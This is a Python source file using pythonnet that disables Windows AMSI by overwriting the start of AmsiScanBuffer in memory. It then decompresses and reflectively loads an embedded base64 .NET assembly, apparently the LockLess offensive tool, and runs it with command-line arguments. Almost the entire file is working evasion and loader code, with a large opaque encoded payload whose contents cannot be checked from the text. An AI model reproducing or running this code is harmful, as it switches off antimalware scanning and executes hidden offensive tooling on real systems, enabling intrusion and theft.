import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("LockLess.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()